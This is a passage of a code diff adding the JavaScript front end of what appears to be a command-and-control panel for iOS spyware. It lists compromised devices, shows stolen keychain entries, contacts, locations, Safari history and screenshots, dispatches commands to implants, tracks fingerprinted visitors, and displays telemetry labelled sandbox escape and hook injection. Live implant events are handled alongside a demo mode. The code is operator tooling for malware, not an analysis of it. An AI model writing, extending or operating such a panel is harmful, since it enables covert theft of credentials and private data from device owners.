+          <td class="py-2.5 px-3 text-center">${dylibBadge}</td>
+          <td class="py-2.5 px-3 text-center text-xs font-mono text-slate-dim">${d.pid}</td>
+        </tr>`;
+    }).join('');
+  }
+
+  function appendTelemetryEvent(evt) {
+    const stream = document.getElementById('terminal-stream');
+    if (!stream) return;
+    const ts = new Date(evt.timestamp * 1000);
+    const tsStr = `${String(ts.getHours()).padStart(2,'0')}:${String(ts.getMinutes()).padStart(2,'0')}:${String(ts.getSeconds()).padStart(2,'0')}.${String(ts.getMilliseconds()).padStart(3,'0')}`;
+    const colors = {
+      'DEVICE_FINGERPRINT': '#06b6d4', 'BEACON_PING': '#00ff88',
+      'PAYLOAD_FETCH': '#f59e0b', 'IPC_HANDSHAKE': '#3b82f6',
+      'HOOK_INJECT': '#ef4444', 'DYLIB_LOAD': '#ef4444',
+      'SANDBOX_ESCAPE': '#a855f7', 'ENTITLEMENT_CHECK': '#06b6d4',
+    };
+    const color = colors[evt.event_type] || '#00ff88';
+    const line = document.createElement('div');
+    line.innerHTML = `<span style="color:#475569">[${tsStr}]</span> <span style="color:${color}">${evt.event_type}</span> <span style="color:#64748b">|</span> <span style="color:#94a3b8">ch=</span><span style="color:#06b6d4">${evt.channel_code || '—'}</span> <span style="color:#94a3b8">ver=</span><span style="color:#a855f7">${evt.device_version || '—'}</span> <span style="color:#94a3b8">ip=</span><span style="color:#f59e0b">${evt.ip || '—'}</span> <span style="color:#94a3b8">dst=</span><span style="color:#3b82f6">${evt.domain || '—'}</span>`;
+    stream.appendChild(line);
+    if (stream.children.length > 200) stream.removeChild(stream.firstChild);
+    stream.scrollTop = stream.scrollHeight;
+  }
+
+  // === DEMO MODE STATE ===
+  let demoRunning = false;
+  let demoDeviceCount = 0;
+  let demoExfilCount = 0;
+  let demoCmdCount = 0;
+
+  const EXFIL_ICONS = {
+    keychain: { icon: 'key', color: 'text-neon-red', bg: 'bg-neon-red/10', label: 'Keychain' },
+    contacts: { icon: 'users', color: 'text-neon-blue', bg: 'bg-neon-blue/10', label: '通讯录' },
+    location: { icon: 'map-pin', color: 'text-neon-green', bg: 'bg-neon-green/10', label: '定位' },
+    safari_history: { icon: 'globe', color: 'text-neon-purple', bg: 'bg-neon-purple/10', label: 'Safari' },
+  };
+
+  function showDemoPhase(data) {
+    const banner = document.getElementById('demo-phase-banner');
+    if (!banner) return;
+    banner.classList.remove('hidden');
+    banner.classList.add('demo-phase-banner');
+    document.getElementById('demo-phase-title').textContent = data.title;
+    document.getElementById('demo-phase-num').textContent = `PHASE ${data.phase}`;
+    document.getElementById('demo-phase-desc').textContent = data.description;
+
+    const icon = banner.querySelector('[data-lucide]');
+    const phaseIcons = { 1: 'satellite-dish', 2: 'bug', 3: 'smartphone', 4: 'download-cloud', 5: 'terminal', 6: 'check-circle' };
+    if (icon && phaseIcons[data.phase]) {
+      icon.setAttribute('data-lucide', phaseIcons[data.phase]);
+      if (window.lucide) lucide.createIcons({ nodes: [icon] });
+    }
+
+    const colors = { 1: 'border-neon-blue/30', 2: 'border-neon-red/30', 3: 'border-neon-green/30', 4: 'border-neon-amber/30', 5: 'border-neon-cyan/30', 6: 'border-neon-green/50' };
+    banner.className = banner.className.replace(/border-neon-\w+\/\d+/g, '');
+    banner.classList.add(colors[data.phase] || 'border-neon-blue/30');
+  }
+
+  function showDemoDevice(data) {
+    const panel = document.getElementById('demo-devices-panel');
+    const list = document.getElementById('demo-devices-list');
+    if (!panel || !list) return;
+    panel.classList.remove('hidden');
+    demoDeviceCount++;
+    document.getElementById('demo-device-count').textContent = demoDeviceCount;
+
+    const card = document.createElement('div');
+    card.className = 'demo-device-card bg-void/80 rounded-lg p-3 border border-neon-green/20';
+    card.innerHTML = `
+      <div class="flex items-center justify-between mb-1.5">
+        <div class="flex items-center gap-2">
+          <span class="layer-indicator layer-error pulse-dot"></span>
+          <span class="text-xs font-mono text-white font-semibold">${data.model_name || data.device_id}</span>
+        </div>
+        <span class="badge badge-red">COMPROMISED</span>
+      </div>
+      <div class="grid grid-cols-2 gap-x-4 gap-y-1 mt-2">
+        <div class="text-[10px] text-slate-dim">IP <span class="text-neon-amber font-mono">${data.ip}</span></div>
+        <div class="text-[10px] text-slate-dim">iOS <span class="text-neon-purple font-mono">${data.ios_version}</span></div>
+        <div class="text-[10px] text-slate-dim">运营商 <span class="text-neon-cyan font-mono">${data.carrier || '—'}</span></div>
+        <div class="text-[10px] text-slate-dim">Session <span class="text-neon-blue font-mono">${data.session_id?.slice(0, 8) || '—'}</span></div>
+      </div>
+    `;
+    list.appendChild(card);
+    list.scrollTop = list.scrollHeight;
+  }
+
+  function showDemoExfil(data) {
+    const panel = document.getElementById('demo-exfil-panel');
+    const list = document.getElementById('demo-exfil-list');
+    if (!panel || !list) return;
+    panel.classList.remove('hidden');
+    demoExfilCount++;
+    document.getElementById('demo-exfil-count').textContent = demoExfilCount;
+
+    const meta = EXFIL_ICONS[data.exfil_type] || { icon: 'file', color: 'text-slate-text', bg: 'bg-void', label: data.exfil_type };
+
+    const card = document.createElement('div');
+    card.className = 'exfil-card bg-void/80 rounded-lg p-3 border border-void-border exfil-flash';
+
+    let itemsHtml = '';
+    if (data.exfil_type === 'screenshot') {
+      itemsHtml = `<div class="text-[10px] text-slate-dim mt-1 font-mono"><span class="text-neon-green">${data.reason || 'capture'}</span> <span class="text-slate-dim">${data.image_size || 0} bytes</span>${data.native ? ' <span class="text-neon-amber">native</span>' : ''}</div>`;
+    } else if (data.exfil_type === 'keychain') {
+      itemsHtml = (data.items || []).map(it =>
+        `<div class="text-[10px] text-slate-dim mt-1 font-mono truncate"><span class="text-neon-red">${it.service}</span> <span class="text-slate-dim">→</span> <span class="text-neon-amber">${it.account}</span></div>`
+      ).join('');
+    } else if (data.exfil_type === 'contacts') {
+      itemsHtml = (data.items || []).map(it =>
+        `<div class="text-[10px] text-slate-dim mt-1 font-mono"><span class="text-white">${it.name}</span> <span class="text-neon-blue">${it.phone}</span></div>`
+      ).join('');
+    } else if (data.exfil_type === 'location') {
+      const loc = data.items?.[0];
+      if (loc) itemsHtml = `<div class="text-[10px] text-slate-dim mt-1 font-mono"><span class="text-neon-green">${loc.city}</span> <span class="text-slate-dim">(${loc.lat}, ${loc.lon})</span> <span class="text-neon-amber">精度 ${loc.accuracy}</span></div>`;
+    } else if (data.exfil_type === 'safari_history') {
+      itemsHtml = (data.items || []).map(it =>
+        `<div class="text-[10px] text-slate-dim mt-1 font-mono truncate"><span class="text-neon-purple">${it.title}</span> <span class="text-slate-dim">${it.url}</span></div>`
+      ).join('');
+    }
+
+    card.innerHTML = `
+      <div class="flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <div class="w-7 h-7 rounded-lg ${meta.bg} flex items-center justify-center"><i data-lucide="${meta.icon}" class="w-3.5 h-3.5 ${meta.color}"></i></div>
+          <div>
+            <span class="text-xs text-white font-medium">${data.title}</span>
+            <span class="text-[10px] text-slate-dim ml-2">${data.device_name || data.device_id}</span>
+          </div>
+        </div>
+        <span class="badge badge-amber font-mono">${data.count} 条</span>
+      </div>
+      ${itemsHtml}
+    `;
+
+    list.appendChild(card);
+    list.scrollTop = list.scrollHeight;
+    if (window.lucide) lucide.createIcons({ nodes: [card] });
+
+    const mc = document.getElementById('metric-captured');
+    if (mc) {
+      const cur = parseInt(mc.textContent.replace(/,/g, ''), 10) || 0;
+      mc.textContent = (cur + (data.count || 1)).toLocaleString();
+    }
+  }
+
+  function showDemoCommand(data, isAck) {
+    const panel = document.getElementById('demo-c2-panel');
+    const list = document.getElementById('demo-c2-list');
+    if (!panel || !list) return;
+    panel.classList.remove('hidden');
+
+    if (!isAck) {
+      demoCmdCount++;
+      document.getElementById('demo-cmd-count').textContent = demoCmdCount;
+    }
+
+    const line = document.createElement('div');
+    const now = new Date();
+    const ts = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
+
+    if (isAck) {
+      const resultStr = data.result ? JSON.stringify(data.result) : 'OK';
+      line.innerHTML = `<span style="color:#475569">[${ts}]</span> <span style="color:#00ff88">ACK</span> <span style="color:#64748b">←</span> <span style="color:#06b6d4">${data.cmd}</span> <span style="color:#64748b">from</span> <span style="color:#a855f7">${data.device_id || data.session_id?.slice(0, 8)}</span> <span style="color:#475569">result=</span><span style="color:#94a3b8">${resultStr.length > 80 ? resultStr.slice(0, 80) + '...' : resultStr}</span>`;
+    } else {
+      line.innerHTML = `<span style="color:#475569">[${ts}]</span> <span style="color:#f59e0b">DISPATCH</span> <span style="color:#64748b">→</span> <span style="color:#06b6d4">${data.cmd}</span> <span style="color:#64748b">to</span> <span style="color:#a855f7">${data.target_device || data.targets?.[0]?.slice(0, 8) || '—'}</span>`;
+    }
+    list.appendChild(line);
+    list.scrollTop = list.scrollHeight;
+  }
+
+  function resetDemoUI() {
+    demoDeviceCount = 0;
+    demoExfilCount = 0;
+    demoCmdCount = 0;
+    ['demo-phase-banner', 'demo-devices-panel', 'demo-exfil-panel', 'demo-c2-panel'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.classList.add('hidden');
+    });
+    ['demo-devices-list', 'demo-exfil-list', 'demo-c2-list'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.innerHTML = '';
+    });
+  }
+
+  // Demo control buttons
+  document.getElementById('demo-start-btn')?.addEventListener('click', async () => {
+    if (demoRunning) return;
+    demoRunning = true;
+    resetDemoUI();
+    document.getElementById('demo-overlay').classList.remove('hidden');
+    document.getElementById('demo-start-btn').classList.add('hidden');
+    document.getElementById('demo-start-btn').classList.remove('flex');
+    document.getElementById('demo-stop-btn').classList.remove('hidden');
+    document.getElementById('demo-stop-btn').classList.add('flex');
+    if (currentPage !== 'dashboard') switchPage('dashboard');
+    try {
+      await apiFetch('/api/demo/start', { method: 'POST' });
+    } catch (e) {
+      alert('Backend not available. Start the backend first: python backend/c2_server.py');
+      demoRunning = false;
+      document.getElementById('demo-start-btn').classList.remove('hidden');
+      document.getElementById('demo-stop-btn').classList.add('hidden');
+    }
+  });
+
+  document.getElementById('demo-stop-btn')?.addEventListener('click', async () => {
+    demoRunning = false;
+    document.getElementById('demo-start-btn').classList.remove('hidden');
+    document.getElementById('demo-start-btn').classList.add('flex');
+    document.getElementById('demo-stop-btn').classList.add('hidden');
+    document.getElementById('demo-stop-btn').classList.remove('flex');
+    try { await apiFetch('/api/demo/stop', { method: 'POST' }); } catch (_) {}
+  });
+
+  function applyLayerUpdate(data) {
+    if (!data || !data.layer_id) return;
+    const badge = document.querySelector(`[data-layer-badge="${data.layer_id}"]`);
+    const dot = document.querySelector(`[data-layer-dot="${data.layer_id}"]`);
+    if (badge && data.status) {
+      badge.textContent = String(data.status).toUpperCase();
+      badge.className = data.status === 'active'
+        ? 'badge-green text-[10px] px-2 py-0.5 rounded-full'
+        : data.status === 'degraded'
+          ? 'badge-amber text-[10px] px-2 py-0.5 rounded-full'
+          : 'badge-red text-[10px] px-2 py-0.5 rounded-full';
+    }
+    if (dot && data.status) {
+      dot.className = 'layer-indicator pulse-dot ' + (
+        data.status === 'active' ? 'layer-active' :
+        data.status === 'degraded' ? 'layer-warning' : 'layer-error'
+      );
+    }
+    if (data.layer_id === 'L1' && data.metrics && data.metrics.events_per_hour != null) {
+      const el = document.getElementById('l1-events');
+      if (el) el.textContent = Number(data.metrics.events_per_hour).toLocaleString();
+    }
+    if (data.layer_id === 'L3' && data.metrics) {
+      const ipc = document.getElementById('l3-ipc-channels');
+      const hb = document.getElementById('l3-c2-heartbeat');
+      if (ipc && data.metrics.ipc_channels != null) ipc.textContent = String(data.metrics.ipc_channels);
+      if (hb && data.metrics.c2_heartbeat != null) hb.textContent = String(data.metrics.c2_heartbeat);
+    }
+  }
+
+  function showImplantPost(data) {
+    const panel = document.getElementById('demo-c2-panel');
+    const list = document.getElementById('demo-c2-list');
+    if (!panel || !list) return;
+    panel.classList.remove('hidden');
+    const row = document.createElement('div');
+    row.className = 'text-neon-green truncate';
+    const bodyPreview = JSON.stringify(data.body || {}).slice(0, 160);
+    row.textContent = `[REAL] implant-post ${data.ip || '—'}: ${bodyPreview}`;
+    list.prepend(row);
+  }
+
+  let sseRetryMs = 3000;
+
+  function connectSSE() {
+    if (sseConnection) { sseConnection.close(); sseConnection = null; }
+    const token = getAuthToken();
+    const sseUrl = API_BASE + '/api/events' + (token ? ('?access_token=' + encodeURIComponent(token)) : '');
+    const banner = document.getElementById('backend-status-banner');
+    try {
+      sseConnection = new EventSource(sseUrl);
+      sseConnection.onopen = () => {
+        sseRetryMs = 3000;
+        if (banner) banner.classList.add('hidden');
+      };
+      sseConnection.addEventListener('telemetry', (e) => {
+        try {
+          const data = JSON.parse(e.data);
+          appendTelemetryEvent(data);
+          fetchDashboardData();
+        } catch (_) {}
+      });
+      sseConnection.addEventListener('implant_register', (e) => {
+        try {
+          const data = JSON.parse(e.data);
+          if (data.simulated) return;
+          loadDevicesFromAPI();
+          refreshC2Panel();
+          fetchDashboardData();
+        } catch (_) {}
+      });
+      sseConnection.addEventListener('device_update', () => {
+        loadDevicesFromAPI();
+      });
+      sseConnection.addEventListener('device_assets_update', () => {
+        if (currentPage === 'assets') loadAssetsDashboard();
+        fetchDashboardData();
+      });
+      sseConnection.addEventListener('collect_record_update', () => {
+        if (currentPage === 'records') loadRecordsFromAPI();
+      });
+      sseConnection.addEventListener('collect_executed', () => {
+        loadRecordsFromAPI();
+        if (currentPage === 'assets') loadAssetsDashboard();
+      });
+      sseConnection.addEventListener('demo_implant_register', (e) => {
+        try { showDemoDevice(JSON.parse(e.data)); } catch (_) {}
+      });
+      sseConnection.addEventListener('demo_telemetry', (e) => {
+        if (!demoRunning) return;
+        try { appendTelemetryEvent(JSON.parse(e.data)); } catch (_) {}
+      });
+      sseConnection.addEventListener('demo_phase', (e) => {
+        try {
+          const data = JSON.parse(e.data);
+          showDemoPhase(data);
+          if (data.phase === 6) {
+            demoRunning = false;
+            document.getElementById('demo-start-btn').classList.remove('hidden');
+            document.getElementById('demo-start-btn').classList.add('flex');
+            document.getElementById('demo-stop-btn').classList.add('hidden');
+            document.getElementById('demo-stop-btn').classList.remove('flex');
+          }
+        } catch (_) {}
+      });
+      sseConnection.addEventListener('demo_exfil_result', (e) => {
+        try { showDemoExfil(JSON.parse(e.data)); } catch (_) {}
+      });
+      sseConnection.addEventListener('exfil_result', (e) => {
+        try {
+          const data = JSON.parse(e.data);
+          if (data.exfil_type === 'keychain' && data.entries && !data.items) {
+            data.items = data.entries.map(it => ({
+              service: it.service || it.label || 'keychain',
+              account: it.account || '',
+            }));
+          }
+          showDemoExfil(data);
+        } catch (_) {}
+      });
+      sseConnection.addEventListener('demo_command_dispatch', (e) => {
+        try { showDemoCommand(JSON.parse(e.data), false); } catch (_) {}
+      });
+      sseConnection.addEventListener('demo_command_ack', (e) => {
+        try { showDemoCommand(JSON.parse(e.data), true); } catch (_) {}
+      });
+      sseConnection.addEventListener('command_dispatch', (e) => {
+        try {
+          if (demoRunning) return;
+          refreshC2Panel();
+        } catch (_) {}
+      });
+      sseConnection.addEventListener('command_ack', (e) => {
+        try {
+          if (demoRunning) return;
+          refreshC2Panel();
+        } catch (_) {}
+      });
+      sseConnection.addEventListener('visitor', (e) => {
+        try { handleVisitorSSE(JSON.parse(e.data)); } catch (_) {}
+      });
+      sseConnection.addEventListener('implant_post', (e) => {
+        try {
+          const data = JSON.parse(e.data);
+          showImplantPost(data);
+          appendTelemetryEvent({
+            timestamp: data.timestamp || (Date.now() / 1000),
+            event_type: 'IMPLANT_POST',
+            channel_code: 'c2:implant-post',
+            device_version: '',
+            ip: data.ip || '',
+            domain: 'c2.implant-post',
+          });
+        } catch (_) {}
+      });
+      sseConnection.addEventListener('layer_update', (e) => {
+        try { applyLayerUpdate(JSON.parse(e.data)); } catch (_) {}
+      });
+      sseConnection.addEventListener('daemon_hooks_update', (e) => {
+        try {
+          const data = JSON.parse(e.data);
+          if (data.hooks) renderDaemonTableFromAPI(data.hooks);
+        } catch (_) {}
+      });
+      sseConnection.onerror = () => {
+        if (banner) {
+          banner.textContent = '后端连接断开，正在重连…';
+          banner.classList.remove('hidden');
+        }
+        if (sseConnection) { sseConnection.close(); sseConnection = null; }
+        setTimeout(connectSSE, sseRetryMs);
+        sseRetryMs = Math.min(sseRetryMs * 2, 30000);
+      };
+    } catch (_) {}
+  }
+
+  // === REAL DATA FUNCTIONS ===
+  window.exportData = function(type, format) {
+    const token = getAuthToken();
+    const qs = new URLSearchParams({ format });
+    if (token) qs.set('access_token', token);
+    const url = `${API_BASE}/api/export/${type}?${qs.toString()}`;
+    window.open(url, '_blank');
+  };
+
+  window.saveWebhook = async function() {
+    const url = document.getElementById('webhook-url').value.trim();
+    const type = document.getElementById('webhook-type').value;
+    const enabled = document.getElementById('webhook-enabled').checked;
+    try {
+      await apiFetch('/api/notifications/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ webhook_url: url, webhook_type: type, enabled }),
+      });
+      alert('Webhook config saved');
+    } catch (e) { alert('保存失败: ' + e.message); }
+  };
+
+  window.testWebhook = async function() {
+    try {
+      const json = await apiFetch('/api/notifications/test', { method: 'POST' });
+      alert(json.code === 0 ? 'Test sent successfully' : 'Failed: ' + json.msg);
+    } catch (e) { alert('测试失败: ' + e.message); }
+  };
+
+  async function loadQRCode() {
+    try {
+      const json = await apiFetch('/api/qrcode/url');
+      const url = json.data.url;
+      document.getElementById('qr-url').textContent = url;
+      const token = getAuthToken();
+      const qrQs = token ? ('?format=svg&access_token=' + encodeURIComponent(token)) : '?format=svg';
+      const img = document.getElementById('qr-image');
+      img.innerHTML = `<img src="${API_BASE}/api/qrcode${qrQs}" alt="QR Code" style="width:100%;height:100%;" onerror="this.parentElement.textContent='QR Failed'" />`;
+    } catch (_) {
+      document.getElementById('qr-image').textContent = 'Backend offline';
+    }
+  }
+
+  async function loadWebhookConfig() {
+    try {
+      const json = await apiFetch('/api/notifications/config');
+      document.getElementById('webhook-url').value = json.data.webhook_url || '';
+      document.getElementById('webhook-type').value = json.data.webhook_type || 'generic';
+      document.getElementById('webhook-enabled').checked = json.data.enabled;
+    } catch (_) {}
+  }
+
+  async function loadVisitors() {
+    try {
+      const json = await apiFetch('/api/visitors?limit=20');
+      document.getElementById('visitor-total').textContent = json.data.total;
+      renderVisitorTable(json.data.visitors);
+    } catch (_) {}
+  }
+
+  function renderVisitorTable(visitors) {
+    const tbody = document.getElementById('visitor-tbody');
+    if (!tbody) return;
+    if (!visitors || visitors.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="6" class="text-center text-slate-dim text-xs py-6 font-mono">Waiting for visitors...</td></tr>';
+      return;
+    }
+    tbody.innerHTML = visitors.map(v => {
+      const t = new Date(v.created_at * 1000);
+      const ts = `${String(t.getHours()).padStart(2,'0')}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')}`;
+      return `
+        <tr class="border-b border-void-border hover:bg-neon-blue/[0.03] transition-colors">
+          <td class="py-2 px-2 text-[11px] font-mono text-neon-amber">${v.ip || '—'}</td>
+          <td class="py-2 px-2 text-[11px] font-mono text-white">${v.device_model || '—'}</td>
+          <td class="py-2 px-2 text-[11px] font-mono text-neon-purple">${v.ios_version || '—'}</td>
+          <td class="py-2 px-2 text-[11px] font-mono text-slate-dim">${v.screen_w && v.screen_h ? v.screen_w + 'x' + v.screen_h : '—'}</td>
+          <td class="py-2 px-2 text-[11px] text-slate-dim">${v.language || '—'}</td>
+          <td class="py-2 px-2 text-[11px] font-mono text-slate-dim">${ts}</td>
+        </tr>`;
+    }).join('');
+  }
+
+  function handleVisitorSSE(data) {
+    const tbody = document.getElementById('visitor-tbody');
+    if (!tbody) return;
+    const placeholder = tbody.querySelector('td[colspan]');
+    if (placeholder) tbody.innerHTML = '';
+
+    const total = document.getElementById('visitor-total');
+    if (total) total.textContent = (parseInt(total.textContent) || 0) + 1;
+
+    const t = new Date((data.timestamp || Date.now() / 1000) * 1000);
+    const ts = `${String(t.getHours()).padStart(2,'0')}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')}`;
+    const tr = document.createElement('tr');
+    tr.className = 'border-b border-void-border exfil-flash';
+    tr.innerHTML = `
+      <td class="py-2 px-2 text-[11px] font-mono text-neon-amber">${data.ip || '—'}</td>
+      <td class="py-2 px-2 text-[11px] font-mono text-white">${data.device_model || '—'}</td>
+      <td class="py-2 px-2 text-[11px] font-mono text-neon-purple">${data.ios_version || '—'}</td>
+      <td class="py-2 px-2 text-[11px] font-mono text-slate-dim">${data.screen || '—'}</td>
+      <td class="py-2 px-2 text-[11px] text-slate-dim">${data.language || '—'}</td>
+      <td class="py-2 px-2 text-[11px] font-mono text-slate-dim">${ts}</td>
+    `;
+    tbody.insertBefore(tr, tbody.firstChild);
+    if (tbody.children.length > 20) tbody.removeChild(tbody.lastChild);
+  }
+
+  function startDashboardRefresh() {
+    setInterval(() => fetchDashboardData(), 30000);
+  }
+
+  // === INIT ===
+  loadUiState();
+  loadCaptcha();
+  if (sessionLoggedIn && getAuthToken()) {
+    renderTabs();
+    enterApp();
+  } else {
+    renderTabs();
+  }
+  startDashboardRefresh();
+})();
+</script>
+</body>
+</html>
